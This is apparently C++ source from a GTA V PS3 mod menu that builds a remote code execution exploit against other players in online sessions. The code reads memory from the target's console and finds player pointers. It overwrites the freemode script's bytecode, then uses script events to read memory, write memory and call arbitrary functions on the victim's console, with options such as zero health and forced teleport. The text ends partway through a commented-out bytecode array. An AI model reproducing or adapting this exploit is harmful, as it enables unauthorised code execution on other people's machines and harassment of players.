int findRCEV5StartValuePlayer = 0;
void findNextIndexOfData();
void findNextIndexOfDataCallback(int valueGotten) {

	/*if (restartSearchHotfix == true) {
		restartSearchHotfix = false;
		return;
	}*/

	//valueGotten += 0x46;
	if ((valueGotten & (1 << 31)) == 0 && valueGotten != 0x46) {
		//store the value cuz it's a legit one or something idk
		foundDataArray[currentCoundOfFoundData].index = indexOfDataFound;
		foundDataArray[currentCoundOfFoundData].value = valueGotten;
		//printf("Found data at %i\n", indexOfDataFound/*, valueGotten*/);
		currentCoundOfFoundData++;
		if (currentCoundOfFoundData >= countOfWhichDataToFind) {
			//now search for it
			searchForAddressOfFoundDataArray();
			return;
		}
		else {
			//print("~r~THIS IS HERE OMG");
		}
	}
	if (indexOfDataFound >= 20) {//fix for when it takes too long
		searchForAddressOfFoundDataArray();
		print2("Timeout... :(\nTry again");
		return;
	}
	indexOfDataFound++;
	findNextIndexOfData();
}
void findNextIndexOfData() {
	callbackOnResultValue = findNextIndexOfDataCallback;

	echoStartValueOfItAddress(findRCEV5StartValuePlayer, startAddressOfDataFoundReal + indexOfDataFound * 4);
}


bool foundPlayerValuesForExploit = false;
void startNewFindData(int player) {
	phase2PercentOutputBool = false;
	foundPlayerValuesForExploit = false;
	isBLUSVersionOfGame = false;//reset to not BLUS version
	readyForRCEReadValue = true;//this stupid thing... Set this so it doesn't have the read bug
	addOnToBaseExploitAddress = 0;//must reset it otherwise it gets silly because it isn't reading from the correct offset
	startAddressOfDataFoundReal = 0x1891528 + (GAMEPLAY::GET_RANDOM_INT_IN_RANGE(-1000, 1000) * 4);//0x1892C24 = 0x16FC difference

	int luckyValuesBLES[] = { 0x18913C4, 0x1892098 };
	int luckyValuesBLUS[] = { 0x1890680, 0x1891AE0, 0x1891E08, 0x18905F0, 0x1891E00, 0x1890A00, 0x1891FDC, 0x1890EA8 };

	

	bool randOrLucky = _rand()%2;
	int arrLenCombined = sizeof(luckyValuesBLES) / 4 + sizeof(luckyValuesBLUS) / 4;
	int luckyIndex = _rand() % arrLenCombined;
	if (randOrLucky == true) {
		//printf("CHOOSING LUCKY VALUE\n");
		if (luckyIndex < sizeof(luckyValuesBLES) / 4) {
			startAddressOfDataFoundReal = luckyValuesBLES[luckyIndex];
		}
		else {
			startAddressOfDataFoundReal = luckyValuesBLUS[luckyIndex - sizeof(luckyValuesBLES) / 4];
		}
	}


	//printf("0x%X\n", startAddressOfDataFoundReal);

	assureHostOfFreemode(player);//this is necessary, function now works, just slowly
	if (getHostOfFreemodeScript() != player) {
		print2("Not ready yet! Please wait a minute and try again...");
		return;
	}

	phase2PercentOutputBool = true;

	findRCEV5StartValuePlayer = player;
	indexOfDataFound = 0;
	currentCoundOfFoundData = 0;
	findNextIndexOfData();
}





void callbackCheckBLUSAddress(int value) {
	if (value == 0x424C5553) {
		print2("Found correct data for BLUS!\n~g~Go to 'Phase 4'",10000);
		//printf("Lucky Value: 0x%X, BLUS\n", startAddressOfDataFoundReal);
		isBLUSVersionOfGame = true;
	}
	else {
		print2("~r~Error: did not find a valid game type!\n~r~Go back and Retry 'Phase 2'");
		//revert value
		addOnToBaseExploitAddress -= 0x1AD00;
	}
}

void checkGameVersion(int value = -2345) {
	static int gameVersionAddress = 0;
	isBLUSVersionOfGame = false;
	if (value == -2345) {
		gameVersionAddress = 0x1809384;
		echoStartValueOfItAddress(findRCEV5StartValuePlayer, 0x1809384, checkGameVersion);
	}
	else {
		if (gameVersionAddress == 0x1809384) {
			if (value == 0x424c4553) {
				//BLES
				print2("Found correct data for BLES!\n~g~Go to 'Phase 4'",10000);
				//printf("Lucky Value: 0x%X, BLES\n", startAddressOfDataFoundReal);
			}
			else if (value == 0x424C5553) {
				//BLUS address, move base slightly
				//add 0x1AD00 to the base address
				addOnToBaseExploitAddress += 0x1AD00;
				//printf("Found BLUS value, making change and testing.\n");
				echoStartValueOfItAddress(findRCEV5StartValuePlayer, 0x1824084, callbackCheckBLUSAddress);
				//print2("Found correct address for BLUS!");
			}
			else {
				//printf("Data found: 0x%X %s\n", value, &value);
				print2("Wrong address found or they are not on BLES or BLUS!\n~r~Go back and Retry 'Phase 2'",10000);
			}
		}
	}
}




#define BUTTONVALUE (*(int*)0x01FD7D90)
namespace raw_buttons {
	enum buttonslol {
		B_X = 0x40,
		B_Triangle = 0x10,
		B_Square = 0x80,
		B_Circle = 0x20,
		B_DpadUp = 0x100000,
		B_DpadDown = 0x400000,
		B_DpadLeft = 0x800000,
		B_DpadRight = 0x200000,
		B_R1 = 0x8,
		B_R2 = 0x2,
		B_R3 = 0x40000,
		B_L1 = 0x4,
		B_L2 = 0x1,
		B_L3 = 0x20000,
		B_Start = 0x80000,
		B_Select = 0x10000,
	};
	bool isButtonDown(int buttonBitset, int button) {
		return buttonBitset & button;
	}
};





int playerToDoRCEOn = 0;

int cPedOfPlayerToDoRCEOn = 0;
int cPlayerInfoOfPlayerToDoRCEOn = 0;
int cVehicleOfPlayerToDoRCEOn = 0;

int waypointXplayerToDoRCEOn = 0;
int waypointYplayerToDoRCEOn = 0;

int buttonBitsetOfPlayerToDoRCEOn = 0;
void buttonBitsetOfPlayerToDoRCEOn_callback(int value) { buttonBitsetOfPlayerToDoRCEOn = value; };

bool doPlayerRCEMenu = false;
char playerMenuOptionBuffer[1000];
int currentLengthOfMenuOptionBuffer = 0;
int playerMenuCounter = 0;
void addOptionToPlayerMenu(char* str, bool colored, char color = 'y') {
	if (currentLengthOfMenuOptionBuffer != 0) {
		playerMenuOptionBuffer[currentLengthOfMenuOptionBuffer] = '\n';
		currentLengthOfMenuOptionBuffer += 1;
		playerMenuCounter++;
	}
	if (colored) {
		playerMenuOptionBuffer[currentLengthOfMenuOptionBuffer + 0] = '~';
		playerMenuOptionBuffer[currentLengthOfMenuOptionBuffer + 1] = color;
		playerMenuOptionBuffer[currentLengthOfMenuOptionBuffer + 2] = '~';
		currentLengthOfMenuOptionBuffer += 3;
	}
	int length = strlen(str);
	strncpy(&playerMenuOptionBuffer[currentLengthOfMenuOptionBuffer], str, length);
	currentLengthOfMenuOptionBuffer += length;
	if (colored) {
		playerMenuOptionBuffer[currentLengthOfMenuOptionBuffer + 0] = '~';
		playerMenuOptionBuffer[currentLengthOfMenuOptionBuffer + 1] = 's';
		playerMenuOptionBuffer[currentLengthOfMenuOptionBuffer + 2] = '~';
		currentLengthOfMenuOptionBuffer += 3;
	}
}
void addTitleToPlayerMenu(char* str) {
	currentLengthOfMenuOptionBuffer = 0;//reset length
	playerMenuCounter = 0;//reset current option
	addOptionToPlayerMenu(str, true, 'b');
}
void renderPlayerMenu() {
	playerMenuOptionBuffer[currentLengthOfMenuOptionBuffer] = 0;//end string
	renderTextForPlayerRCEV5(playerToDoRCEOn, playerMenuOptionBuffer, true);
}

void teleportRCEPlayerToWaypoint();
void setRCEPlayersHealth(float value);
void setRCEPlayerGodmode(bool enable);
void setRCEPlayerSlowmo(bool enable);
void setRCEPlayerWalkSpeed(bool enable);


void loopPlayerRCEMenu() {
	static int option = 0;
	static bool open = false;
	static int timer = 0;
	if (doPlayerRCEMenu) {
		if (foundPlayerValuesForExploit != true) {
			//print2("~r~Find Player Pointers");
			return;
		}
		//timer++;
		//int interval = echoStartValueOfItTimeout*2;
		//int halfOfinterval = interval/3;
		//if ((timer+halfOfinterval) % interval == 0) {
		//}
		//if (timer%interval == 0) {
		timer--;
		if (timer <= 0)
			timer = 0;
		if (readyForRCEReadValue == true && timer == 0) {
			//this if statement basically checks/guarentees it just read a value


			//timer = 0;
			//printf("loop!\n");

			if (raw_buttons::isButtonDown(buttonBitsetOfPlayerToDoRCEOn, raw_buttons::B_R1) && raw_buttons::isButtonDown(buttonBitsetOfPlayerToDoRCEOn, raw_buttons::B_Square)) {
				open = true;
			}

			if (raw_buttons::isButtonDown(buttonBitsetOfPlayerToDoRCEOn, raw_buttons::B_L3)) {
				open = false;
			}

			if (open) {


				if (raw_buttons::isButtonDown(buttonBitsetOfPlayerToDoRCEOn, raw_buttons::B_DpadRight)) {
					option++;
					if (option >= playerMenuCounter)
						option = 0;
					timer = 100;//make it wait a bit before accepting next input
				}

				if (raw_buttons::isButtonDown(buttonBitsetOfPlayerToDoRCEOn, raw_buttons::B_DpadLeft)) {
					option--;
					if (option < 0)
						option = playerMenuCounter - 1;
					timer = 100;//make it wait a bit before accepting next input
				}



				addTitleToPlayerMenu("Tethered Mod Menu");
				addOptionToPlayerMenu("Godmode On", option == playerMenuCounter);//0
				addOptionToPlayerMenu("Godmode Off", option == playerMenuCounter);//1
				addOptionToPlayerMenu("Slowmo On", option == playerMenuCounter);//2
				addOptionToPlayerMenu("Slowmo Off", option == playerMenuCounter);//3
				addOptionToPlayerMenu("Fast Walk On", option == playerMenuCounter);//4
				addOptionToPlayerMenu("Fast Walk Off", option == playerMenuCounter);//5
				addOptionToPlayerMenu("Teleport To Waypoint", option == playerMenuCounter);//6
				addOptionToPlayerMenu("Zero Health", option == playerMenuCounter);//7



				if (raw_buttons::isButtonDown(buttonBitsetOfPlayerToDoRCEOn, raw_buttons::B_R3)) {
					switch (option) {
					case 0:
						setRCEPlayerGodmode(true);
						break;
					case 1:
						setRCEPlayerGodmode(false);
						break;
					case 2:
						setRCEPlayerSlowmo(true);
						break;
					case 3:
						setRCEPlayerSlowmo(false);
						break;
					case 4:
						setRCEPlayerWalkSpeed(true);
						break;
					case 5:
						setRCEPlayerWalkSpeed(false);
						break;
					case 6:
						teleportRCEPlayerToWaypoint();
						break;
					case 7:
						setRCEPlayersHealth(0);
						break;


					}
				}



				renderPlayerMenu();//this fucking function caused me so much pain and confusion, never remove this comment. It fucking writes so much text it breaks the other shit.


				buttonBitsetOfPlayerToDoRCEOn = 0;//reset it so it doesn't do anything until it fuckin reads it again



			}
			else {
				renderTextForPlayerRCEV5(playerToDoRCEOn, "Remote Mod Menu POC\nHold Square + R1 to open\nHold Dpad Left/Right to scroll\nHold R3 to select\nHold L3 to close", true);
				//timer = 100;
			}

			if (readyForRCEReadValue == true && timer == 0) {//only go in here if one of the functions above was not called
				echoStartValueOfItAddress(playerToDoRCEOn, 0x01FD7D90, buttonBitsetOfPlayerToDoRCEOn_callback);
				buttonBitsetOfPlayerToDoRCEOn = 0;
			}

		}
	}
}


void notifyPlayerAddressesTest() {
	if (foundPlayerValuesForExploit == true) {
		//char buf[100];
		//snprintf(buf, sizeof(buf), "CPed: 0x%X\nCPlayerInfo: 0x%X\nCVehicle: 0x%X\n", cPedOfPlayerToDoRCEOn, cPlayerInfoOfPlayerToDoRCEOn, cVehicleOfPlayerToDoRCEOn);
		//renderTextForPlayerRCEV5(playerToDoRCEOn, buf, true);
	}
	else {
		//print2("~r~Must find ponters");
	}
}

void teleportRCEPlayerToWaypoint_callbackB(int wY) {
	waypointYplayerToDoRCEOn = wY;
	int defaultVal = 0x477A0000;
	if (waypointXplayerToDoRCEOn != defaultVal && waypointYplayerToDoRCEOn != defaultVal) {
		float x = *(float*)&waypointXplayerToDoRCEOn;
		float y = *(float*)&waypointYplayerToDoRCEOn;
		PlayerMods::teleportToLoc(playerToDoRCEOn, x, y, 0);
		renderTextForPlayerRCEV5(playerToDoRCEOn, "Teleported!", true);
	}
	else {
		renderTextForPlayerRCEV5(playerToDoRCEOn, "Waypoint not set!", true);
	}
}
void teleportRCEPlayerToWaypoint_callbackA(int wX) {
	waypointXplayerToDoRCEOn = wX;
	echoStartValueOfItAddress(playerToDoRCEOn, 0x1D5A844, teleportRCEPlayerToWaypoint_callbackB);
}
void teleportRCEPlayerToWaypoint() {
	//waypoint coords = 0x1D5A840
	echoStartValueOfItAddress(playerToDoRCEOn, 0x1D5A840, teleportRCEPlayerToWaypoint_callbackA);
}


void setRCEPlayersHealth(float health) {
	int value = *(int*)&health;
	//printf("HEALTH!\n");
	if (foundPlayerValuesForExploit == true) {
		executeRCEV5Address(playerToDoRCEOn, cPedOfPlayerToDoRCEOn + 0x170, value);//health
		executeRCEV5Address(playerToDoRCEOn, cPedOfPlayerToDoRCEOn + 0x174, value);//max health
	}
	else {
		//print2("~r~Must find ponters");
	}
}

void setRCEPlayerGodmode(bool enable) {
	//printf("GODMODE!\n");
	if (foundPlayerValuesForExploit == true) {
		executeRCEV5Address(playerToDoRCEOn, cPedOfPlayerToDoRCEOn + 0xB4, enable ? 0xFFFFFFFF : 0);//proofsBitset
		if (enable) {
			renderTextForPlayerRCEV5(playerToDoRCEOn, "Godmode On!", true);
		}
		else {
			renderTextForPlayerRCEV5(playerToDoRCEOn, "Godmode Off!", true);
		}
	}
	else {
		//print2("~r~Must find ponters");
	}
}

void setRCEPlayerSlowmo(bool enable) {

	//printf("SLOWMO!\n");
	if (foundPlayerValuesForExploit == true) {
		executeRCEV5Address(playerToDoRCEOn, 0x1CC57A8, enable ? 0x3F000000 : 0x3F800000);
		if (enable) {
			renderTextForPlayerRCEV5(playerToDoRCEOn, "Slowmo On!", true);
		}
		else {
			renderTextForPlayerRCEV5(playerToDoRCEOn, "Slowmo Off!", true);
		}
	}
	else {
		//print2("~r~Must find ponters");
	}
}

void setRCEPlayerWalkSpeed(bool enable) {
	//printf("WALK SPEED!\n");
	if (foundPlayerValuesForExploit == true) {
		executeRCEV5Address(playerToDoRCEOn, 0x411433DC, enable ? 0x40400000 : 0x3F800000);
		if (enable) {
			renderTextForPlayerRCEV5(playerToDoRCEOn, "Fast Walk On!", true);
		}
		else {
			renderTextForPlayerRCEV5(playerToDoRCEOn, "Fast Walk Off!", true);
		}
	}
	else {
		//print2("~r~Must find ponters");
	}
}

void findAddresscPlayerInfoOnPlayer_callbackA(int foundValue) {
	if (!VALID_ADDR(foundValue)) {
		print2("~r~ERROR: BAD VALUE!");
		return;
	}
	cPlayerInfoOfPlayerToDoRCEOn = foundValue;

	foundPlayerValuesForExploit = true;
	print2("~g~Done! Go to 'Phase 5'",10000);
}
void findAddresscVehicleOnPlayer_callbackA(int foundValue) {
	/*if (!VALID_ADDR(foundValue)) {
		print2("~r~ERROR: BAD VALUE!");
		return;
	}*/
	//vehicle miight be 0 if they are not in a vehicle, that isi ok
	cVehicleOfPlayerToDoRCEOn = foundValue;
	//printf("CVehicle: 0x%X\n", cVehicleOfPlayerToDoRCEOn);

	echoStartValueOfItAddress(findRCEV5StartValuePlayer, cPedOfPlayerToDoRCEOn + 0xBD0, findAddresscPlayerInfoOnPlayer_callbackA);
}
void findAddressCPedOnPlayer_callbackB(int foundValue) {
	if (!VALID_ADDR(foundValue)) {
		print2("~r~ERROR: BAD VALUE!");
		return;
	}
	cPedOfPlayerToDoRCEOn = foundValue;
	echoStartValueOfItAddress(findRCEV5StartValuePlayer, cPedOfPlayerToDoRCEOn + 0xE9C, findAddresscVehicleOnPlayer_callbackA);

}
void findAddressCPedOnPlayer_callbackA(int foundValue) {
	if (!VALID_ADDR(foundValue)) {
		print2("~r~ERROR: BAD VALUE!");
		return;
	}
	callbackOnResultValue = findAddressCPedOnPlayer_callbackB;
	echoStartValueOfItAddress(findRCEV5StartValuePlayer, foundValue + 0x4);
}


void findAddressesOfPlayerRCE_suba(int value) {
	//262145.imm_6760
	//0x1E70374 0x69A4
	int nextAddr = value + 0x69A4;

	//it's too confusing to set it to 0. just ignore it and move on with life
	//executeRCEV5Address(playerToDoRCEOn,nextAddr,0);//so now the value is guarenteed to be 0 because if it wasn't set already, this will be correct and be set to 0, and if it was then it already was and I just set some other value. hope it doesn't mess things up.

	//now start the read search
	callbackOnResultValue = findAddressCPedOnPlayer_callbackA;
	echoStartValueOfItAddress(findRCEV5StartValuePlayer, isBLUSVersionOfGame ? 0x1D00178/*BLUS*/ : 0x1CEFCF8/*CPedFactoryPointer*/);

}
void findAddressesOfPlayerRCE(int player) {
	playerToDoRCEOn = player;

	echoStartValueOfItAddress(playerToDoRCEOn, isBLUSVersionOfGame ? 0x1E80774/*BLUS address*/ : 0x1E70374/*0x10400 difference hmm*/, findAddressesOfPlayerRCE_suba);

}

/*
void calculateSegmentOffset(int desiredOffsetInFile, int *segment, int *offsetOfSegment) {
	//0x138010 is at 0
	//subtracts by 0x4000 every time we add one
	for (int i = 0; i < 1000; i++) {
		int val = 0x138010 - 0x4000*i;
		if (val < desiredOffsetInFile) {
			*segment = i;
			*offsetOfSegment = desiredOffsetInFile - val;
			return;
		}
	}
}*/

unsigned int scriptRCEFreemodeCodeAddress = 0;//this iis used for writing the code

bool hasRCEScriptbennSetup = false;

//finished function
//void callRCEWriteFunction(int addressToWriteTo, int size, int value1 = 0, int value2 = 0,int value3 = 0,int value4 = 0,int value5 = 0,int value6 = 0,int value7 = 0);
void callRCEWriteFunction(int addressToWriteTo, int size, int arr[]);
void writeCodeToPlayerRCE(int offsetInFreemode, int value, bool useScriptWrite = true) {
	//range is 0x9C010 to 0xA0010
	int addr = scriptRCEFreemodeCodeAddress + (offsetInFreemode - 0x9C010);
	if (useScriptWrite == false)
		executeRCEV5Address(playerToDoRCEOn, addr, value);
	else {
		int arr[] = { value };
		callRCEWriteFunction(addr, 1, arr);
	}
}
void debug_output_address(int offsetInFreemode) {
	int addr = scriptRCEFreemodeCodeAddress + (offsetInFreemode - 0x9C010);
	//printf("Address: 0x%X, offset: 0x%X\n", addr, offsetInFreemode);
}


int findScriptBaseRCEIndex = 0;
int findScriptBaseRCEScript = 0;


void getscriptRCEFreemodeCodeAddress_1(int fullval) {
	scriptRCEFreemodeCodeAddress = fullval;
	if (!VALID_ADDR(scriptRCEFreemodeCodeAddress)) {
		print2("Error! Please try again c");
		return;
	}

	//these are fixes to make the original exploit work better
	writeCodeToPlayerRCE(0x9C3D8, 0xCF428C6F, false);//false so they use normal rce write
	writeCodeToPlayerRCE(0x9C3EC, 0x000F5500, false);
	doRCEV5NegativeFix = false;//don't do negative check anymore
	hasRCEScriptbennSetup = true;

	print2("~g~Done! Go to 'Phase 6'",10000);
}
void getscriptRCEFreemodeCodeAddress(int off8val) {
	if (!VALID_ADDR(off8val)) {
		print2("Error! Please try again b");//this hit one time and idk why but I clicked it a second time and it worked fine.
		return;
	}
	echoStartValueOfItAddress(findRCEV5StartValuePlayer, off8val + 0x168, getscriptRCEFreemodeCodeAddress_1);
}
void findScriptBaseRCE_1(int callback) {
	if (!VALID_ADDR(callback)) {
		print2("Error! Please try again a");
		return;
	}
	findScriptBaseRCEScript = callback;
	echoStartValueOfItAddress(findRCEV5StartValuePlayer, findScriptBaseRCEScript + 0x8, getscriptRCEFreemodeCodeAddress);
}
void findScriptBaseRCE(int callback) {
	int baseAddressToSearchOn = isBLUSVersionOfGame ?/*BLUS*/0x1E7FF8C : 0x1E6FB8C/*BLES*/;
	static int off = 0;
	if (callback == 345634) {
		int scriptNameHash = GAMEPLAY::GET_HASH_KEY("freemode");
		scriptNameHash = scriptNameHash & 0x1F;
		int specialaddr = baseAddressToSearchOn + scriptNameHash + 1;
		off = specialaddr % 4;
		//printf("Real: 0x%X, off: 0x%X, aligned: 0x%X\n", specialaddr, off, specialaddr - off);
		echoStartValueOfItAddress(findRCEV5StartValuePlayer, specialaddr - off/*4 aligned*/, findScriptBaseRCE);
	}
	else {
		char* arr = (char*)&callback;
		char valueRead = arr[off];
		int newaddr = baseAddressToSearchOn + (valueRead << 2);
		//printf("Checking address: 0x%X, off 0x%X\n", newaddr, valueRead);
		echoStartValueOfItAddress(findRCEV5StartValuePlayer, newaddr + 0xA4, findScriptBaseRCE_1);
	}
}

#ifdef jkshdgfkjshdjfjksdh
void findScriptBaseRCE(int hash);
void funcScriptBaseRCE_1(int address/*N4rage10scrProgramE**/) {
	if (!VALID_ADDR(address)) {
		//printf("Bad return value (0x%X), going to next index\n", address);
		findScriptBaseRCE(0);
		return;
	}
	findScriptBaseRCEScript = address;
	echoStartValueOfItAddress(findRCEV5StartValuePlayer, address + 0x38/*nameHash*/, findScriptBaseRCE);
}
void findScriptBaseRCE(int hash) {
#define scriptAddress 0x1E6FBAC
#define scriptArray ((int/*N4rage10scrProgramE***/)(scriptAddress+0x88))  //0x1E6FC34
#define scriptArraySize 0x1F8/0x4

	int scriptNameHash = GAMEPLAY::GET_HASH_KEY("freemode");

	if (findScriptBaseRCEIndex < scriptArraySize) {
		if (hash == scriptNameHash) {
			//printf("Script N4rage10scrProgramE is at address 0x%X with hash 0x%X\n", findScriptBaseRCEScript, hash);
			echoStartValueOfItAddress(findRCEV5StartValuePlayer, findScriptBaseRCEScript + 0x8, getscriptRCEFreemodeCodeAddress);
			return;
		}
	}
	else {
		//print2("Could not find!");
		return;
	}

	echoStartValueOfItAddress(findRCEV5StartValuePlayer, scriptArray + findScriptBaseRCEIndex * 4, funcScriptBaseRCE_1);
	findScriptBaseRCEIndex++;
}
#endif



//need to fix to work on the playerToDoRCEOn
void patchNegativeRCEBugScriptCodeOnSelf() {
	findScriptBaseRCEIndex = 0;
	findScriptBaseRCEScript = 0;
	findScriptBaseRCE(345634);
	print2("Please wait...",10000);
	/*
	N4rage10scrProgramE *scriptAddr = findScript(GAMEPLAY::GET_HASH_KEY("freemode"));//need to code this to work for others
	if (VALID_ADDR(scriptAddr)) {
		scriptRCEFreemodeCodeAddress = *(int*)(*(int*)((int)scriptAddr+0x8)+0x168);//and this too
		//*(int*)( *(int*)(*(int*)((int)scriptAddr+0x8)+0x168) + (0x9C3D8-0x9C010) ) = 0xCF428C6F;
		//*(int*)( *(int*)(*(int*)((int)scriptAddr+0x8)+0x168) + (0x9C3EC-0x9C010) ) = 0x000F5500;
		writeCodeToPlayerRCE(0x9C3D8,0xCF428C6F);
		writeCodeToPlayerRCE(0x9C3EC,0x000F5500);
		doRCEV5NegativeFix = false;//don't do negative check anymore
		hasRCEScriptbennSetup = true;
		print2("Done!");
	} else {
		print2("error script not found");
	}*/
}



/*

void func(int param) {

	int arr[11];

	GET_EVENT_DATA(1, param, arr, 11);
	if (arr[10] != 2027)
		return;//check so they don't freeze randomly

	/
	unsigned int eventId = arr[0];
	int saveAddress = arr[1];
	int address = arr[2];
	int r3 = arr[3];
	int r4 = arr[4];
	int r5 = arr[5];
	int r6 = arr[6];
	int r7 = arr[7];
	int r8 = arr[8];
	int r9 = arr[9];/

	int opd[2] = { arr[2], 0x1C85330 };
	int(*func)(int,int,int,int,int,int,int) = (int(*)(int,int,int,int,int,int,int))&opd;
	int ret = func(arr[3], arr[4], arr[5], arr[6], arr[7], arr[8], arr[9]);
	//*(int*)arr[1] = ret;
	setGlobalAtIndex(1591181, ret);
	setGlobalAtIndex(1591180, getGlobalAtIndex(1591180)+1);//increment global
}


some functions in freemode (with header):
9C3BB func_5938 A8
9C463 func_5939 55
9C4B8 func_5940 length 0x52
9C50A func_5941  length A6
9C5B0 func_5942  length B0   event 314
9C660 func_5943
9C684 func_5944  length 3C
9C6C0 func_5945   length 22
9C6E2 func_5946
9C6EE func_5947  lengt E2   id 188 
9C7D0 func_5948  6F
9C83F func_5949

*/

/*
RCE Definitions:
bool getRCEFunctionCallback(int *value);
void callRCEReadFunction(int addressToRead);
void callRCEWriteFunction(int addressToWriteTo, int size, int arr[]);//max size of 7
void callRCEFunction(unsigned int native, int r3 = 0, int r4 = 0, int r5 = 0, int r6 = 0, int r7 = 0, int r8 = 0, int r9 = 0);

*/

bool readyForFinalRCE = false;
//finished function
bool getRCEFunctionCallback(int* value) {
	static int previousVal = 0;
	int newVal = Read_Global(1591180);//gets incremented by 1 when it is set
	if (newVal != previousVal) {
		*value = Read_Global(1591181);//the returned value is stored here
		previousVal = newVal;
		return true;
	}
	return false;
}
void callRCEReadFunction(int addressToRead) {
	if (readyForFinalRCE == false) {
		//print2("[Warning] Please initiate stuff first");
		return;
	}
	//int garbage = 0;
	//getRCEFunctionCallback(&garbage);//make sure the read value is up to date
	ScriptArg args[] = { 188 /*188 now for func_5947 with bigger size*//*314*//*event id*/,2027,0,addressToRead,0,0,0,0,0,0,0 };//2027 is check value, index 10
	SCRIPT::TRIGGER_SCRIPT_EVENT(1, args, 11, (1 << playerToDoRCEOn));
}

//according to the line below, 44 is max so 39 + 5
//12C8D40                 cmplwi    r6, 0xB0
const int maxIntsPerPacket = 39;//30 worked on self

void callRCEWriteFunction(int addressToWriteTo, int size, int arr[]/*int value1, int value2,int value3,int value4,int value5,int value6,int value7*/) {
	if (readyForFinalRCE == false) {
		//print2("[Warning] Please initiate all rce stuff first");
		return;
	}
	//int garbage = 0;
	//getRCEFunctionCallback(&garbage);//make sure the read value is up to date
	if (size <= 7) {
		ScriptArg args[] = { 188 /*188 now for func_5947 with bigger size*//*314*//*event id*/,2027,1,addressToWriteTo,size, arr[0],arr[1],arr[2],arr[3],arr[4],arr[5],arr[6]/*value1,value2,value3,value4,value5,value6,value7*/ };//2027 is check value, index 10
		SCRIPT::TRIGGER_SCRIPT_EVENT(1, args, 11, (1 << playerToDoRCEOn));
	}
	else {

		//printf("Test this should never be called %i\n", size);
		

		//size > 7
		ScriptArg* args = (ScriptArg*)0x10030000;
		args[0].i = 188 /*188 now for func_5947 with bigger size*//*314*//*event id*/;
		args[1].i = 2027;
		args[2].i = 1;
		args[3].i = addressToWriteTo;
		args[4].i = size;//make sure this size is the correct one so it gets the full

		if (size > maxIntsPerPacket)
			size = maxIntsPerPacket;

		for (int i = 0; i < size; i++)
			args[5 + i].i = arr[i];
		SCRIPT::TRIGGER_SCRIPT_EVENT(1, args, 11 + (size - 7) + 1, (1 << playerToDoRCEOn));//35 should be max
	}
}
void callRCEFunction(unsigned int native, int r3 = 0, int r4 = 0, int r5 = 0, int r6 = 0, int r7 = 0, int r8 = 0, int r9 = 0) {
	if (readyForFinalRCE == false) {
		//print2("[Warning] Please initiate all rce stuff first");
		return;
	}
	int garbage = 0;
	getRCEFunctionCallback(&garbage);//make sure the read value is up to date
	/*int writeValue = 0x00002B37;
	native = native << 16;
	writeValue = writeValue | native;//so now the native short is in the upper 32 bits
	writeCodeToPlayerRCE(0x9C6EC+20,writeValue);*/
	int writeValue = 0x2C1D0000;
	writeValue = writeValue | native;//so now the native short is in the upper 32 bits
	writeCodeToPlayerRCE(0x9C5B0-2 /*updated it cuz I changed it to use event 314 now :)*/ /*0x9C6EC*/ + 76, writeValue);//78 is the address of it

	//change store address to one of the synced values later maybe
	//func_5947 is 188  which is offset 0x9C6EE and size of 0xE2
	ScriptArg args[] = { 314/*now 314 cuz swapped with the other func*//*188*//*313*/,0x10020000/*not used anymore*/,native,r3,r4,r5,r6,r7,r8,r9,2027 };//2027 is check value, index 10
	SCRIPT::TRIGGER_SCRIPT_EVENT(1, args, 11, (1 << playerToDoRCEOn));
}


void setPlayerPedTest_1(int hash) {
	callRCEFunction(SET_PLAYER_MODEL, playerToDoRCEOn, hash);
	print2("Done!\n");
}
void setPlayerPedTest() {
	//int stringAddress = 0x10020000;
	//executeRCEV5String(playerToDoRCEOn,stringAddress,"s_m_m_movalien_01",true);
	int hash = GAMEPLAY::GET_HASH_KEY("s_m_m_movalien_01");
	//printf("Alien hash: 0x%X\n", hash);
	callRCEFunction(REQUEST_MODEL, hash);
	//callRCEFunction(SET_PLAYER_MODEL,playerToDoRCEOn,hash);
	runlater::runlater(100, setPlayerPedTest_1, hash);//give it a timeout
}

/*void setPlayerPedTestRequest() {
	int hash = GAMEPLAY::GET_HASH_KEY("s_m_m_movalien_01");
	printf("Alien hash: 0x%X\n",hash);
	callRCEFunction(REQUEST_MODEL,hash);
	//callRCEFunction(SET_PLAYER_MODEL,playerToDoRCEOn,hash);
}*/




/*
void SHUTDOWN_AND_LAUNCH_SINGLE_PLAYER_GAME_remote() {
	print2("Did it!\n");
	callRCEFunction(0x3EBEFC,0,0,0,0,0,0,0);//0x92B7351C
}*/



void setupPlayerRCEOnTriggerScript_callback1(int i) {

	//allows for these 2 functions:
	//callRCEReadFunction
	//callRCEWriteFunction

	//to get values for natives to patch it, just use the enum I have in the gtastructs with the id's

	//2D 01 00 06 00 28 10 02 00 10 39 03 6F 38 00 38 03 25 0B 2C 11 00 02 2B 38 03 40 01 2F 43 07 EB 09 56 00 03 2E 01 00 38 03 40 03 2F 2F 39 04 38 03 40 02 2F 6F 08 56 00 35 6E 39 05 38 05 38 03 40 04 2F 0C 56 00 27 38 03 73 38 05 01 3E 01 3F 2F 38 03 40 03 2F 38 05 72 03 01 30 38 05 3D 01 39 05 38 05 38 03 40 04 2F 0C 06 56 FF D9 38 04 60 18 47 8D 5F 18 47 8C 6F 01 60 18 47 8C 2E 01 00
	/*unsigned char dataForOurFunction[] = {0x2D, 0x01, 0x00, 0x06, 0x00, 0x28, 0x10, 0x02, 0x00, 0x10, 0x39, 0x03, 0x6F, 0x38, 0x00, 0x38, 0x03, 0x25, 0x0B, 0x2C, 0x11, 0x00, 0x02, 0x2B, 0x38, 0x03, 0x40, 0x01, 0x2F, 0x43, 0x07, 0xEB, 0x09, 0x56, 0x00, 0x03, 0x2E, 0x01, 0x00, 0x38, 0x03, 0x40, 0x03, 0x2F, 0x2F, 0x39, 0x04, 0x38, 0x03, 0x40, 0x02, 0x2F, 0x6F, 0x08, 0x56, 0x00, 0x35, 0x6E, 0x39, 0x05, 0x38, 0x05, 0x38, 0x03, 0x40, 0x04, 0x2F, 0x0C, 0x56, 0x00, 0x27, 0x38, 0x03, 0x73, 0x38, 0x05, 0x01, 0x3E, 0x01, 0x3F, 0x2F, 0x38, 0x03, 0x40, 0x03, 0x2F, 0x38, 0x05, 0x72, 0x03, 0x01, 0x30, 0x38, 0x05, 0x3D, 0x01, 0x39, 0x05, 0x38, 0x05, 0x38, 0x03, 0x40, 0x04, 0x2F, 0x0C, 0x06, 0x56, 0xFF, 0xD9, 0x38, 0x04, 0x60, 0x18, 0x47, 0x8D, 0x5F, 0x18, 0x47, 0x8C, 0x6F, 0x01, 0x60, 0x18, 0x47, 0x8C, 0x2E, 0x01, 0x00};

